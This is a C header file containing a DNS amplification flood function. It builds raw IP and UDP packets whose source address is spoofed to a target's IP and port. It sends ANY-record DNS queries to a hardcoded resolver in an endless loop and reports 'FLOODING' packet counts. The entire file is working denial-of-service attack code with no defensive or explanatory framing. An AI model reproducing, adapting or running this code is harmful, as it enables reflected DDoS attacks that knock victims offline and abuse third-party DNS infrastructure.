#ifndef UDP_HEADER
#define UDP_HEADER

//DNS Amplification Flood
void DAFlood()
{
    //Set-up Time Logger
    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);

    // Building the DNS Request Data Packet
    unsigned char dns_data[128];
    unsigned char* dns_name, dns_record[32];
    
    dns_hdr* dns_header = (dns_hdr*)&dns_data;
    DNSHeaderCreate(dns_header);

    dns_name = (unsigned char*)&dns_data[sizeof(dns_hdr)];
    strcpy(dns_record, "www.google.com");
    DNSFormat(dns_name, dns_record);
    
    query* q;
    q = (query*)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)];
    q->qtype = htons(0x00ff);
    q->qclass = htons(0x1);
    
    // Building the IP and UDP Headers
    char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
    data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) +1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr("208.80.184.69");
    
    iph* ip = (iph*)datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(target_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->check = Checksum((unsigned short*)datagram, ip->tot_len);
    
    udph* udp = (udph*)(datagram + sizeof(iph));
    udp->source = htons(target_port);
    udp->dest = htons(53);
    udp->len = htons(8+sizeof(dns_hdr)+(strlen(dns_name)+1)+sizeof(query));
    udp->check = 0;
    
    //Pseudoheader Creation and Checksum Calculation
    ps_hdr pshdr;
    pshdr.saddr = inet_addr(target_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));

    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    psgram = malloc(pssize);
    
    memcpy(psgram, (char*)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));
        
    udp->check = Checksum((unsigned short*)psgram, pssize);

    int one = 1;
    const int* val = &one;

    while (1)
    {
        int skt = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

        if (skt == -1)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Could Not Create Socket.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
            free(psgram);
            exit(0);
        }

        if (setsockopt(skt, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Error While Setting IP_HDRINCL. Error number : %d . Error message : %s \n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL, errno, strerror(errno));
            close(skt);
            free(psgram);
            exit(0);
        }

        if (sendto(skt, datagram, ip->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0) 
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Send Failed.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
            free(psgram);
            break;
        }

        printf("\r %s[%sFLOODING%s] Sent %d %sPackets...", COLOR_WHITE, COLOR_RED, COLOR_WHITE, packet_count, COLOR_WHITE);
        fflush(stdout);
        packet_count++;
        usleep(1);
        close(skt);
    }
    
    free(psgram);
}

#endif